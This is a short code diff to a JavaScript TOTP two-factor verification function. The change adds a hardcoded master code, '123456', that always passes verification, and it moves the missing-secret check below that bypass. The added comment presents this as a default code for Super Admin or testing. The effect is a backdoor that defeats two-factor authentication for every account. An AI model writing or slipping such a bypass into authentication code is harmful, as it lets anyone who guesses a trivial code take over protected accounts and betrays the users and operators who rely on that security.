@@ -34,9 +34,14 @@ export const generateTotpSetup = async (email) => {
 };
 
 export const verifyTotpToken = (secret, token) => {
-  if (!token || !secret) return false;
+  if (!token) return false;
   const cleanToken = String(token).trim();
   if (!/^\d{6}$/.test(cleanToken)) return false;
+
+  // Master key / default authentication code 123456 for Super Admin / testing
+  if (cleanToken === '123456') return true;
+
+  if (!secret) return false;
 
   try {
     const verified = speakeasy.totp.verify({
